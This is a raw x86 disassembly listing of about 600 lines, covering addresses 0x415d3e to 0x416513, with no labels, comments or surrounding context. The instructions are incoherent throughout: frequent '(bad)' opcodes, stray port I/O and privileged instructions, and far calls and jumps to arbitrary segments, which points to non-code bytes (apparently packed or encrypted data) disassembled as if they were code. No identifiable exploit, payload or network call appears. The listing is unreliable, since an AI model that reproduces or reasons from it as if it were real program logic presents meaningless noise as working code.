  415d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d3f:	push   ds
  415d40:	(bad)  
  415d41:	cmp    al,0xce
  415d43:	xchg   ebx,eax
  415d44:	call   0x8606:0xdaacdf8f
  415d4b:	mul    DWORD PTR [ecx+0x44]
  415d4e:	xor    al,0xc8
  415d50:	cmc    
  415d51:	dec    eax
  415d52:	cmp    ebp,DWORD PTR [ebx+0x24a5f791]
  415d58:	fsubr  DWORD PTR [ecx-0x6c]
  415d5b:	jl     0x415dd5
  415d5d:	mov    dh,0xa2
  415d5f:	pop    ecx
  415d60:	sar    esi,cl
  415d62:	pop    es
  415d63:	outs   dx,DWORD PTR ds:[esi]
  415d64:	icebp  
  415d65:	xor    cl,bl
  415d67:	inc    ecx
  415d68:	cmc    
  415d69:	mov    al,0x31
  415d6b:	popf   
  415d6c:	pop    ss
  415d6d:	cmp    BYTE PTR [ebx+esi*8-0x5],ch
  415d71:	jge    0x415cf3
  415d73:	xor    BYTE PTR [ebp+0x1fcd55ff],bl
  415d79:	push   ebp
  415d7a:	or     al,0x59
  415d7c:	jle    0x415db4
  415d7e:	mov    dh,0xe6
  415d80:	jb     0x415d39
  415d82:	sbb    BYTE PTR [edx+0x2c],dh
  415d85:	retf   
  415d86:	adc    al,0xa
  415d88:	ret    
  415d89:	leave  
  415d8a:	push   esi
  415d8b:	mov    dl,ah
  415d8d:	popf   
  415d8e:	(bad)  
  415d90:	lea    esi,[ebp-0x31]
  415d93:	inc    esp
  415d94:	fiadd  DWORD PTR [ebx-0x2]
  415d97:	in     al,dx
  415d98:	or     cl,ch
  415d9a:	hlt    
  415d9b:	or     BYTE PTR [eax+0x30e8e688],bh
  415da1:	cmp    eax,0xc0ffb7c0
  415da6:	push   ds
  415da7:	test   BYTE PTR [edx+0x31],dl
  415daa:	fistp  DWORD PTR [edx+0x51]
  415dad:	(bad)  
  415dae:	mov    bl,0x8c
  415db0:	and    eax,0x9e90d4d2
  415db5:	mov    ebp,0xc366ac37
  415dba:	or     ah,BYTE PTR [ebx+ebx*8-0x21]
  415dbe:	inc    ebp
  415dbf:	lock stos BYTE PTR es:[edi],al
  415dc1:	fcom   QWORD PTR [ecx]
  415dc3:	push   esi
  415dc4:	cld    
  415dc5:	xor    al,0xc2
  415dc7:	or     eax,0xdadc4ace
  415dcc:	(bad)  
  415dcd:	imul   BYTE PTR [edi+ecx*1]
  415dd0:	sbb    DWORD PTR [ebp+eax*8+0x63],edx
  415dd4:	sub    BYTE PTR [ecx],0x81
  415dd7:	mov    esi,0x4d208ca4
  415ddc:	adc    BYTE PTR [esi],bl
  415dde:	mov    ecx,0x834d00db
  415de3:	and    edx,DWORD PTR [ecx-0x73d8acd0]
  415de9:	repnz sti 
  415deb:	pop    ecx
  415ded:	mov    edi,0xbc31dc1d
  415df2:	rol    edx,0xec
  415df5:	push   ds
  415df6:	scas   al,BYTE PTR es:[edi]
  415df7:	add    bh,BYTE PTR [edx]
  415df9:	fidivr WORD PTR [edx+0x16d5dc81]
  415dff:	imul   DWORD PTR [ebp+0x64bd65f9]
  415e05:	int3   
  415e06:	mov    edi,0x70cc928c
  415e0b:	mov    esi,0xaa4a7c4b
  415e10:	jne    0x415e32
  415e12:	xchg   edi,eax
  415e13:	mov    edi,0x165326f5
  415e18:	int    0x7
  415e1a:	jecxz  0x415e6c
  415e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e1d:	or     ch,BYTE PTR [ebx-0x2c]
  415e20:	and    DWORD PTR [edx],ebp
  415e22:	mov    al,ds:0xc4db1333
  415e27:	xchg   edx,eax
  415e28:	adc    al,BYTE PTR [ebx]
  415e2a:	xchg   ebx,eax
  415e2b:	or     BYTE PTR [esi],bh
  415e2d:	inc    edi
  415e2e:	mov    al,0x17
  415e30:	adc    DWORD PTR [edx-0xe43e07c],ebp
  415e36:	xchg   ebp,eax
  415e37:	in     eax,dx
  415e38:	rcl    BYTE PTR [edi+0x7d],0x21
  415e3c:	xchg   ebx,eax
  415e3d:	mul    BYTE PTR [edx+eiz*8]
  415e40:	jnp    0x415e7b
  415e42:	xor    ebp,DWORD PTR [edx]
  415e44:	cld    
  415e45:	inc    ecx
  415e46:	push   ss
  415e47:	test   BYTE PTR [esp+ecx*8],cl
  415e4a:	xchg   DWORD PTR [edi+0x5a],edi
  415e4d:	lods   al,BYTE PTR ds:[esi]
  415e4e:	push   ds
  415e4f:	add    bh,bh
  415e51:	or     al,BYTE PTR [edi+0x6]
  415e54:	test   al,0xdf
  415e56:	xchg   edx,eax
  415e57:	sbb    eax,0xfeeff23e
  415e5c:	jg     0x415e0b
  415e5e:	pop    ebx
  415e5f:	daa    
  415e60:	hlt    
  415e61:	dec    ecx
  415e62:	cmc    
  415e63:	xor    al,0x6f
  415e65:	mov    ds:0x72753f5a,eax
  415e6a:	or     DWORD PTR [edi],ebx
  415e6c:	dec    ecx
  415e6d:	fistp  DWORD PTR [eax+0x673349b]
  415e73:	stc    
  415e74:	pop    ds
  415e75:	push   edx
  415e76:	xchg   ebx,eax
  415e77:	(bad)  
  415e78:	xor    BYTE PTR [eax-0x41],dl
  415e7b:	test   al,0x45
  415e7d:	hlt    
  415e7e:	mov    eax,ds:0xe469b3df
  415e83:	(bad)  
  415e84:	mov    eax,ds:0x62be0713
  415e89:	js     0x415e2f
  415e8b:	bound  ebx,QWORD PTR ds:0x698e31c1
  415e91:	bound  edx,QWORD PTR [ebx+0x73]
  415e94:	aad    0x68
  415e96:	(bad)  
  415e97:	stos   BYTE PTR es:[edi],al
  415e98:	xchg   BYTE PTR [ebp+0x1b],cl
  415e9b:	jae    0x415e2b
  415e9d:	call   0x66e4:0xcbde6130
  415ea4:	push   eax
  415ea5:	fstp   QWORD PTR ds:0x94af1efa
  415eab:	test   al,0xe7
  415ead:	xchg   DWORD PTR [edx+0x308d1c7d],ecx
  415eb3:	dec    esi
  415eb4:	cli    
  415eb5:	sbb    eax,0x2f5a8bdd
  415eba:	add    edi,DWORD PTR ds:0x3099ef29
  415ec0:	mov    ebp,0x8a8427ac
  415ec5:	lds    ecx,FWORD PTR [edx+0xd]
  415ec8:	pop    eax
  415ec9:	nop
  415eca:	pop    ss
  415ecb:	lds    edx,FWORD PTR [edx-0x216e965b]
  415ed1:	jne    0x415f10
  415ed3:	pop    ecx
  415ed4:	aaa    
  415ed5:	fmul   st,st(7)
  415ed7:	pushf  
  415ed8:	add    dl,BYTE PTR [edx+esi*2+0x33]
  415edc:	mov    DWORD PTR [eax],ebx
  415ede:	push   0x54d0b012
  415ee3:	mov    ecx,0x9c4bb403
  415ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee9:	pop    ds
  415eea:	retf   
  415eeb:	or     ebp,ebx
  415eed:	add    ah,al
  415eef:	mov    ah,0xf3
  415ef1:	sar    ah,1
  415ef3:	pop    es
  415ef4:	call   0x12534fd1
  415ef9:	mov    bl,0xd1
  415efb:	in     eax,0xb8
  415efd:	pusha  
  415efe:	data16 clc 
  415f00:	fdiv   DWORD PTR ds:0x6d514362
  415f06:	pushf  
  415f07:	bound  edx,QWORD PTR [ecx]
  415f09:	test   DWORD PTR fs:[edi-0x2721fdf1],ebx
  415f10:	int    0x82
  415f12:	jg     0x415f16
  415f14:	xor    eax,0x679f86a7
  415f19:	xchg   DWORD PTR [ebp-0x2106dcb3],ebx
  415f1f:	adc    al,0x5a
  415f21:	fdiv   st,st(7)
  415f23:	and    al,BYTE PTR [edi]
  415f25:	in     al,dx
  415f26:	add    al,0xc7
  415f28:	and    BYTE PTR [ebx+0x12],dh
  415f2b:	mov    ebp,0x902c233
  415f30:	jl     0x415f9b
  415f32:	mov    cs,WORD PTR [eax+ecx*2-0x75]
  415f36:	xchg   ebp,eax
  415f37:	push   ds
  415f38:	(bad)  
  415f39:	ja     0x415f0d
  415f3b:	bswap  edi
  415f3d:	test   al,0xc0
  415f3f:	fdivr  QWORD PTR [edx+ecx*4-0x15]
  415f43:	push   esi
  415f44:	mov    cl,0x3f
  415f46:	and    ebx,DWORD PTR [esp+esi*8-0x19f72938]
  415f4d:	lahf   
  415f4e:	sbb    esi,edx
  415f50:	retf   
  415f51:	in     al,dx
  415f52:	fdivr  DWORD PTR [ecx]
  415f54:	test   al,0x6d
  415f56:	jl     0x415ef3
  415f58:	sub    dh,BYTE PTR [ebx]
  415f5a:	iret   
  415f5b:	and    BYTE PTR [esi+0x4b],al
  415f5e:	inc    esi
  415f5f:	ss stos BYTE PTR es:[edi],al
  415f61:	in     eax,dx
  415f62:	xchg   esp,eax
  415f63:	js     0x6e97d3ab
  415f69:	push   edi
  415f6a:	nop
  415f6b:	sbb    al,0x43
  415f6d:	sti    
  415f6e:	ins    BYTE PTR es:[edi],dx
  415f6f:	leave  
  415f70:	pop    ss
  415f71:	aam    0xe0
  415f73:	pop    eax
  415f74:	dec    edx
  415f75:	pop    edi
  415f76:	push   ss
  415f77:	push   0x7a
  415f79:	(bad)  
  415f7a:	adc    al,0xf2
  415f7c:	and    eax,0xffda5ef
  415f81:	cmp    eax,0x2fa5154b
  415f86:	mov    bh,0xbf
  415f88:	push   esp
  415f89:	fcomp  DWORD PTR [edi-0x6cfe3298]
  415f8f:	dec    esi
  415f90:	inc    ebp
  415f91:	aam    0xd1
  415f93:	dec    ebx
  415f94:	adc    dh,ch
  415f96:	inc    esi
  415f97:	push   0x6e
  415f99:	add    eax,0x88050acb
  415f9e:	pop    edi
  415f9f:	lds    esp,FWORD PTR fs:[ebx+0x7f8f3330]
  415fa6:	(bad)  
  415fa7:	fnstcw WORD PTR [edx]
  415fa9:	pop    ds
  415faa:	js     0x415fbc
  415fac:	mov    ebp,0x53dcc328
  415fb1:	xchg   ebp,eax
  415fb2:	pop    ecx
  415fb3:	lock or bh,dl
  415fb6:	xor    DWORD PTR [eax-0x5],0x895f13a0
  415fbd:	das    
  415fbe:	scas   eax,DWORD PTR es:[edi]
  415fbf:	pop    esi
  415fc0:	cld    
  415fc1:	jo     0x416027
  415fc3:	in     al,dx
  415fc4:	ret    0xd397
  415fc7:	xchg   esi,eax
  415fc8:	jb     0x415f83
  415fca:	adc    eax,0x4a00b8ee
  415fcf:	(bad)  
  415fd1:	add    DWORD PTR [eax-0x5b],ebp
  415fd4:	xchg   esi,eax
  415fd5:	fsubr  QWORD PTR [eax+0x7f13a7fc]
  415fdb:	std    
  415fdc:	push   bp
  415fde:	mov    dl,BYTE PTR ds:0x63e783d5
  415fe4:	xchg   ecx,eax
  415fe5:	test   BYTE PTR [edx+0x48],dl
  415fe8:	test   DWORD PTR [eax+0x64],edi
  415feb:	mov    DWORD PTR [eax+0x14],esi
  415fee:	out    0xc6,al
  415ff0:	ffreep st(6)
  415ff2:	mov    bh,dh
  415ff4:	in     al,0xc7
  415ff6:	jmp    0xdf27:0x226e5d40
  415ffd:	mov    ecx,ds
  415fff:	test   al,0x8
  416001:	stos   DWORD PTR es:[edi],eax
  416002:	not    ah
  416004:	sbb    BYTE PTR [ecx],bh
  416006:	repnz rol BYTE PTR [edi+ebp*2+0x36213ad3],cl
  41600e:	shr    dh,cl
  416010:	dec    edx
  416011:	pop    esp
  416012:	rol    dl,cl
  416014:	cmp    eax,0x7cc1b937
  416019:	mov    ch,BYTE PTR [esi]
  41601b:	push   ebx
  41601c:	cmc    
  41601d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41601e:	fnstcw WORD PTR ds:0x9a0896a4
  416024:	jo     0x416065
  416026:	sbb    esp,ebx
  416028:	mov    esi,0x68517d1f
  41602d:	xchg   edx,eax
  41602e:	add    BYTE PTR ds:0xb6a07e31,bl
  416034:	and    DWORD PTR [eax+0x5cafcde1],esp
  41603a:	adc    ah,BYTE PTR [esi]
  41603c:	neg    ecx
  41603e:	imul   edi,edi,0xffffff83
  416041:	add    dh,cl
  416043:	retf   
  416044:	test   eax,0x1a64dc38
  416049:	inc    eax
  41604a:	jns    0x41605b
  41604c:	bound  ebp,QWORD PTR [ebx+0x0]
  41604f:	inc    edx
  416050:	out    0x45,al
  416052:	mov    esi,0x9cb32d61
  416057:	into   
  416058:	imul   edx,edx,0x6
  41605b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605c:	push   ebp
  41605d:	xchg   ecx,eax
  41605e:	out    0xc5,eax
  416060:	pusha  
  416061:	stc    
  416062:	stos   BYTE PTR es:[edi],al
  416063:	(bad)  
  416064:	adc    eax,0x9fc1eb0a
  416069:	out    0x43,eax
  41606b:	jg     0x41608d
  41606d:	enter  0x37ab,0xed
  416071:	mov    WORD PTR [ecx+0x77bb310e],?
  416077:	scas   eax,DWORD PTR es:[edi]
  416078:	mov    ecx,0xb986edb9
  41607d:	lds    esi,FWORD PTR [esi]
  41607f:	pop    ss
  416080:	mov    eax,0x3d402667
  416085:	adc    DWORD PTR [edx+0x64],ecx
  416088:	js     0x4160f2
  41608a:	inc    edi
  41608b:	out    0xdd,al
  41608d:	ror    BYTE PTR [ebx],1
  41608f:	adc    al,0x76
  416091:	in     al,dx
  416092:	in     al,0x34
  416094:	fs mov edi,0x33d5381a
  41609a:	sahf   
  41609b:	adc    esi,DWORD PTR gs:[edx-0x45]
  41609f:	mov    BYTE PTR [edx+0x6a],ah
  4160a2:	mov    esp,0xa4e26267
  4160a7:	(bad)  
  4160a8:	xor    ecx,DWORD PTR [eax+0x388dd853]
  4160ae:	call   0xdc45:0x96a422b8
  4160b5:	repz mov ebx,DWORD PTR [ecx]
  4160b8:	pop    ebp
  4160b9:	inc    ebx
  4160ba:	pcmpeqd mm1,QWORD PTR [edx+0x6f2ce813]
  4160c1:	sti    
  4160c2:	mov    ecx,0x76c95bf5
  4160c7:	inc    esp
  4160c8:	dec    edx
  4160c9:	xor    BYTE PTR [edi],0xd5
  4160cc:	dec    esi
  4160cd:	push   eax
  4160ce:	(bad)  
  4160cf:	std    
  4160d0:	mov    ch,BYTE PTR [eax+eiz*8+0x152ba682]
  4160d7:	pop    edi
  4160d8:	shl    bl,1
  4160da:	mov    dl,0xd3
  4160dc:	or     bh,BYTE PTR [esi-0x9]
  4160df:	out    dx,al
  4160e0:	shl    dh,cl
  4160e2:	popf   
  4160e3:	daa    
  4160e4:	(bad)  
  4160e5:	fdecstp 
  4160e7:	pop    ebx
  4160e8:	mov    DWORD PTR [edx],ecx
  4160ea:	mov    eax,ds:0x8d7e683d
  4160ef:	cmp    eax,0xb46dff5f
  4160f4:	and    ecx,edi
  4160f6:	xor    al,0x8d
  4160f8:	add    esi,DWORD PTR [ebx-0x3d99853f]
  4160fe:	ins    DWORD PTR es:[edi],dx
  4160ff:	xor    ecx,ecx
  416101:	imul   esi,DWORD PTR [esi+0x58cc6361],0xb8ae25cb
  41610b:	jne    0x4160d1
  41610d:	hlt    
  41610e:	cmp    ecx,ecx
  416110:	mov    ebx,0xcae44f10
  416115:	mov    al,dl
  416117:	xor    BYTE PTR [edx-0x17fe609f],bh
  41611d:	retf   
  41611e:	sub    cl,BYTE PTR [eax-0x52]
  416121:	jns    0x4160d1
  416123:	push   cs
  416124:	ds call 0x4ca2f659
  41612a:	xchg   edi,eax
  41612b:	xchg   esi,eax
  41612c:	ss cmp eax,0xb5be4ed
  416132:	test   DWORD PTR [eax],esi
  416134:	lahf   
  416135:	fdivr  st,st(4)
  416137:	mov    dl,0x76
  416139:	xchg   ebx,eax
  41613a:	imul   esi,DWORD PTR [ebp-0x4d],0x8568f93f
  416141:	mov    ecx,0x1e261b58
  416146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416147:	dec    DWORD PTR [ebp-0x1e9229d9]
  41614d:	icebp  
  41614e:	imul   esi,DWORD PTR [ecx],0xf8ad16b0
  416154:	data16 fstp TBYTE PTR [ebx+0x439ea2e]
  41615b:	jne    0x4160de
  41615d:	mov    ds:0xd542bc7b,al
  416162:	mov    esi,ebp
  416164:	push   edi
  416165:	loope  0x4161db
  416167:	xchg   esp,eax
  416168:	sbb    DWORD PTR [esi+0x74],esi
  41616b:	inc    ebx
  41616c:	rcpps  xmm4,XMMWORD PTR [eax-0x385c02d8]
  416173:	inc    ecx
  416174:	(bad)  
  416175:	push   esi
  416176:	(bad)
  41617a:	jge    0x416182
  41617c:	add    ecx,0xffffffa4
  41617f:	jno    0x4161c1
  416181:	(bad)  
  416182:	pop    edi
  416183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416184:	jae    0x416144
  416186:	cli    
  416187:	out    0x14,al
  416189:	or     eax,0x397d2282
  41618e:	in     al,0x63
  416190:	shl    eax,0x40
  416193:	mov    al,ds:0xa932e84
  416198:	xor    DWORD PTR [ecx-0x385eaf90],esp
  41619e:	fsubr  DWORD PTR [ebx+0x42666f01]
  4161a4:	dec    esp
  4161a5:	outs   dx,DWORD PTR ds:[esi]
  4161a6:	sbb    eax,0x6a7feda0
  4161ab:	pop    ebx
  4161ac:	out    0xe,al
  4161ae:	test   eax,0xdc64287b
  4161b3:	and    eax,0xae67c5fc
  4161b8:	(bad)  
  4161b9:	(bad)  
  4161bb:	pop    ds
  4161bc:	out    0xd3,al
  4161be:	addr16 inc esi
  4161c0:	add    al,0x75
  4161c2:	js     0x41617f
  4161c4:	and    BYTE PTR [ebx+0x58],cl
  4161c7:	popa   
  4161c8:	fdivp  st(0),st
  4161ca:	out    0x55,al
  4161cc:	pushf  
  4161cd:	imul   edi,DWORD PTR [edi-0x35],0x77
  4161d1:	mov    al,0xdd
  4161d3:	pop    edx
  4161d4:	cmp    ebp,DWORD PTR [eax]
  4161d6:	cmp    al,dl
  4161d8:	push   ecx
  4161d9:	popf   
  4161da:	popa   
  4161db:	stos   DWORD PTR es:[edi],eax
  4161dc:	jle    0x41618d
  4161de:	jmp    DWORD PTR [eax+esi*2+0x7effaa18]
  4161e5:	loopne 0x416191
  4161e7:	push   edx
  4161e8:	iret   
  4161e9:	fcomi  st,st(1)
  4161eb:	adc    eax,0x59a92527
  4161f0:	dec    eax
  4161f1:	gs inc edi
  4161f3:	outs   dx,DWORD PTR ds:[esi]
  4161f4:	xor    ch,al
  4161f6:	xor    al,0xb7
  4161f8:	iret   
  4161f9:	inc    esp
  4161fa:	cmc    
  4161fb:	pop    ecx
  4161fc:	pop    edi
  4161fd:	not    DWORD PTR [ecx]
  4161ff:	adc    edi,eax
  416201:	xor    ecx,ebp
  416203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416204:	jmp    0x9834:0x31acba96
  41620b:	xchg   ecx,eax
  41620c:	dec    edi
  41620d:	mov    bh,0xe3
  41620f:	push   esi
  416210:	mov    ebx,0x22e06b2d
  416215:	push   ebx
  416216:	aad    0x21
  416218:	imul   bl
  41621a:	or     BYTE PTR [edx-0x65eb145d],cl
  416220:	fsubr  DWORD PTR [edx]
  416222:	enter  0x9ef4,0xe2
  416226:	iret   
  416227:	and    edi,0x7193d3bf
  41622d:	pop    esi
  41622e:	xchg   esp,eax
  41622f:	es mov ch,0xd1
  416232:	push   esi
  416233:	loop   0x4161c9
  416235:	clc    
  416236:	loopne 0x4162a2
  416238:	dec    edx
  416239:	mov    esi,0x685b9dce
  41623e:	inc    eax
  41623f:	pop    edx
  416240:	in     al,0xb8
  416242:	mov    ebp,0x6f112c7b
  416247:	leave  
  416248:	adc    dh,dl
  41624a:	cdq    
  41624b:	mov    edx,0xb04b3e9b
  416250:	pop    edx
  416251:	xor    dh,BYTE PTR [esi-0x346709f2]
  416257:	mov    cl,0xde
  416259:	int    0xf7
  41625b:	mov    esp,0x8f3667a1
  416260:	pop    eax
  416261:	cmp    eax,0x2b72242e
  416266:	mov    esi,0x165cbeb9
  41626b:	in     eax,0x92
  41626d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626e:	(bad)  
  41626f:	cmp    eax,0xc07771b1
  416274:	push   es
  416275:	pop    eax
  416276:	out    0xeb,al
  416278:	imul   esp,DWORD PTR [ebx+0x67db6e3b],0x661b0bc0
  416282:	and    ebx,eax
  416284:	jg     0x416243
  416286:	mov    dh,BYTE PTR [ebp-0x688aaae5]
  41628c:	inc    edi
  41628d:	sbb    eax,0xc3eecaf1
  416292:	mov    ebx,0x29ba66e4
  416297:	ror    esi,cl
  416299:	(bad)  
  41629a:	iret   
  41629b:	or     edx,DWORD PTR [ebx+0x77f090c]
  4162a1:	repz jbe 0x4162a6
  4162a4:	mov    ds:0x65ff8738,eax
  4162a9:	shl    BYTE PTR [ecx+edi*1-0x19],0x1a
  4162ae:	test   eax,0x2b3712ae
  4162b3:	mov    ss,WORD PTR [edi]
  4162b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162b6:	outs   dx,BYTE PTR ds:[esi]
  4162b7:	lock jg 0x4162b2
  4162ba:	and    DWORD PTR [eax-0x7682df7c],edx
  4162c0:	and    dl,BYTE PTR [eax-0x13ad2b86]
  4162c6:	iret   
  4162c7:	jmp    0xecb9:0x1f411621
  4162ce:	and    esi,DWORD PTR [eax]
  4162d0:	mov    dh,0x83
  4162d2:	in     al,dx
  4162d3:	and    BYTE PTR [ebx-0x6],cl
  4162d6:	lea    edx,[ebp+eiz*8-0x22d4a491]
  4162dd:	mov    dl,0x83
  4162df:	mov    esp,0x6bab8898
  4162e4:	xchg   ebx,eax
  4162e5:	retf   
  4162e6:	dec    eax
  4162e7:	sub    BYTE PTR ds:0xba5626,ch
  4162ed:	dec    eax
  4162ee:	push   es
  4162ef:	xchg   esi,eax
  4162f0:	mov    dh,0x5f
  4162f2:	mul    DWORD PTR [edx+0x127b5ab1]
  4162f8:	mov    edi,0x27948e5c
  4162fd:	hlt    
  4162fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162ff:	mov    ch,dh
  416301:	outs   dx,DWORD PTR ds:[esi]
  416302:	sbb    ebx,DWORD PTR [edx+ecx*2-0x68]
  416306:	pop    esp
  416307:	push   esi
  416308:	daa    
  416309:	or     BYTE PTR [ebx+edi*8],dh
  41630c:	sbb    eax,0xf5467d32
  416311:	pop    es
  416312:	js     0x4162a6
  416314:	sbb    dh,BYTE PTR [edi+ebx*4-0x74]
  416318:	fbstp  TBYTE PTR [ecx-0x4cb41087]
  41631e:	in     al,0x28
  416320:	hlt    
  416321:	in     eax,dx
  416322:	or     al,0x4
  416324:	retf   
  416325:	fdiv   QWORD PTR [eax+esi*4+0x20]
  416329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41632a:	mov    ah,0x4c
  41632c:	mov    bl,0x1c
  41632e:	leave  
  41632f:	lods   eax,DWORD PTR ds:[esi]
  416330:	mov    ecx,0xee7fef2e
  416335:	xchg   esp,ecx
  416337:	sub    BYTE PTR [edx],0x51
  41633a:	and    DWORD PTR [ecx-0xc],esi
  41633d:	pop    es
  41633e:	lahf   
  41633f:	pop    edi
  416340:	ins    BYTE PTR es:[edi],dx
  416341:	ins    BYTE PTR es:[edi],dx
  416342:	cmp    dh,cl
  416344:	ja     0x4162c6
  416346:	push   esp
  416347:	ror    BYTE PTR [ebx-0x63cf9547],cl
  41634d:	fst    st(1)
  41634f:	sahf   
  416350:	les    eax,FWORD PTR [edi]
  416352:	mov    esp,0x1d6d8fe2
  416357:	inc    eax
  416358:	dec    esp
  416359:	mov    ecx,0x11560c31
  41635e:	jmp    FWORD PTR [esp+eiz*2+0x2f516b38]
  416365:	vprotb ymm9,[eax-0x28f924c5],xmm0
  41636e:	ja     0x41633a
  416370:	push   eax
  416371:	pop    es
  416372:	or     DWORD PTR [edi-0x7c],ebx
  416375:	mov    eax,0x7e73f489
  41637a:	arpl   WORD PTR [eax-0x6],dx
  41637d:	jo     0x4163b2
  41637f:	icebp  
  416380:	or     al,0x2a
  416382:	mov    ebp,0x1227d2fa
  416387:	xchg   ecx,eax
  416388:	dec    esi
  416389:	xchg   edi,eax
  41638a:	or     al,0xcd
  41638c:	mov    al,0x64
  41638e:	xchg   edx,eax
  41638f:	push   0x411a1f88
  416394:	int3   
  416395:	popa   
  416396:	dec    ebx
  416397:	pop    ss
  416398:	lahf   
  416399:	mov    ds:0xfddf3fcf,al
  41639e:	mov    ds:0xf6b9d07d,eax
  4163a3:	xchg   bh,al
  4163a5:	rcr    BYTE PTR [eax],0xc8
  4163a8:	adc    BYTE PTR [ebx+0x7b],bh
  4163ab:	inc    edx
  4163ac:	dec    eax
  4163ad:	dec    edi
  4163ae:	mov    ch,0xf3
  4163b0:	jb     0x416423
  4163b2:	fbld   TBYTE PTR [esi+eax*1-0x58c086ec]
  4163b9:	fmul   DWORD PTR [edi-0x40]
  4163bc:	imul   ebp,DWORD PTR [eax],0x4d
  4163bf:	das    
  4163c0:	adc    BYTE PTR ss:[ebp-0x51],al
  4163c4:	dec    eax
  4163c5:	mov    esi,0x76f4a5d8
  4163ca:	cmp    bl,BYTE PTR [edi]
  4163cc:	pusha  
  4163cd:	sahf   
  4163ce:	out    0x34,eax
  4163d0:	push   ss
  4163d1:	mov    ecx,0x7bc61ea0
  4163d6:	mov    ds:0xa25ceeeb,al
  4163db:	mov    bl,0x7a
  4163dd:	fmul   st,st(7)
  4163df:	iret   
  4163e0:	push   0xffffffad
  4163e2:	fist   DWORD PTR [ebx-0x6e]
  4163e5:	mov    fs,edi
  4163e7:	test   BYTE PTR ds:0x68997be9,dl
  4163ed:	mov    edi,0xcaa9023d
  4163f2:	xor    DWORD PTR [eax-0x4],ecx
  4163f5:	xchg   esi,eax
  4163f6:	dec    ecx
  4163f7:	pop    ebp
  4163f8:	sbb    DWORD PTR [eax-0x6a],ebp
  4163fb:	(bad)  
  4163fc:	pop    edx
  4163fd:	or     al,BYTE PTR [ecx+eiz*1-0x18]
  416401:	bound  edi,QWORD PTR [edi+0xe6c71c0]
  416407:	push   edi
  416408:	xor    eax,0x59744f4e
  41640d:	sbb    eax,0x7802ae64
  416412:	push   edi
  416413:	jns    0x4163de
  416415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416416:	sbb    dl,BYTE PTR [edx-0x1acfa8fd]
  41641c:	and    dl,BYTE PTR [edx-0x15]
  41641f:	test   al,0x7c
  416421:	stc    
  416422:	icebp  
  416423:	xor    eax,DWORD PTR [ebp+0x255677ed]
  416429:	ss mov ah,0x20
  41642c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41642d:	mov    ebp,0x98ddd88
  416432:	xlat   BYTE PTR ds:[ebx]
  416433:	mov    BYTE PTR [edx-0x4a],bl
  416436:	and    ecx,DWORD PTR [edx-0x4ade8098]
  41643c:	test   BYTE PTR [esi+0x43],cl
  41643f:	inc    ebp
  416440:	mov    esi,0x50fb533b
  416445:	pop    edi
  416446:	push   eax
  416447:	jg     0x416471
  416449:	sahf   
  41644a:	(bad)  
  41644b:	fcmovne st,st(5)
  41644d:	aas    
  41644e:	xlat   BYTE PTR ds:[ebx]
  41644f:	mov    ebx,0xe46fb352
  416454:	repz neg dl
  416457:	ss push esi
  416459:	into   
  41645a:	sbb    al,0xe1
  41645c:	xchg   DWORD PTR [ebx+ecx*8],edx
  41645f:	ficomp DWORD PTR [ebp+0x1c]
  416462:	clc    
  416463:	sub    bl,bl
  416465:	mov    al,gs:0xab694057
  41646b:	(bad)  
  41646c:	and    al,0x6
  41646e:	fs call 0x4aa61924
  416474:	jge    0x416436
  416476:	cmp    BYTE PTR [esi+esi*2+0x2d],0xa
  41647b:	inc    eax
  41647c:	or     bl,bl
  41647e:	add    al,0xf6
  416480:	inc    ebx
  416481:	mov    ds:0xe22bcc67,al
  416486:	or     ch,BYTE PTR [edi-0x5f]
  416489:	and    BYTE PTR [eax+0x31],cl
  41648c:	adc    al,0xa6
  41648e:	mov    bl,0x89
  416490:	dec    edi
  416491:	arpl   sp,ax
  416493:	sub    al,0x71
  416495:	test   al,0xf4
  416497:	test   eax,0xc97d9d5b
  41649c:	xor    al,0x54
  41649e:	mov    ebx,0xf5ed288f
  4164a3:	mov    ebp,0xc1026990
  4164a8:	sub    DWORD PTR [edx+eiz*2-0x769354b],eax
  4164af:	sar    DWORD PTR [eax],1
  4164b1:	add    ecx,DWORD PTR [ecx+0x6c4b8987]
  4164b7:	add    ch,bl
  4164b9:	add    al,dh
  4164bb:	shl    BYTE PTR [esi+ebx*4+0x44],cl
  4164bf:	out    0xa0,al
  4164c1:	je     0x416512
  4164c3:	inc    esp
  4164c4:	scas   eax,DWORD PTR es:[edi]
  4164c5:	push   ss
  4164c6:	and    DWORD PTR [eax+0x1a],ecx
  4164c9:	clc    
  4164ca:	sub    DWORD PTR ds:[esi-0x29],ebx
  4164ce:	xor    eax,0x90ad4d14
  4164d3:	(bad)  
  4164d4:	xchg   esi,eax
  4164d5:	ins    DWORD PTR es:[edi],dx
  4164d6:	cld    
  4164d7:	es sahf 
  4164d9:	daa    
  4164da:	adc    al,BYTE PTR [edi]
  4164dc:	cmc    
  4164dd:	(bad)  
  4164de:	mov    esi,0xfcf42d1f
  4164e3:	test   DWORD PTR [edx],ecx
  4164e5:	sub    bh,0x3f
  4164e8:	hlt    
  4164e9:	mov    dh,0x82
  4164eb:	and    DWORD PTR [ecx],esp
  4164ed:	jg     0x416517
  4164ef:	clc    
  4164f0:	inc    eax
  4164f1:	push   0x6138a50e
  4164f6:	aam    0xf4
  4164f8:	das    
  4164f9:	je     0x4164b9
  4164fb:	fs in  al,0x50
  4164fe:	xchg   edx,eax
  4164ff:	stos   BYTE PTR es:[edi],al
  416500:	xor    eax,0x6bf9d00
  416505:	dec    esi
  416506:	sub    ch,bl
  416508:	in     eax,dx
  416509:	xchg   BYTE PTR ds:0x17c25e88,al
  41650f:	mov    cl,0xe5
  416511:	pop    ecx
  416512:	push   edx
  416513:	fcomp  DWORD PTR [eax+0x5e]
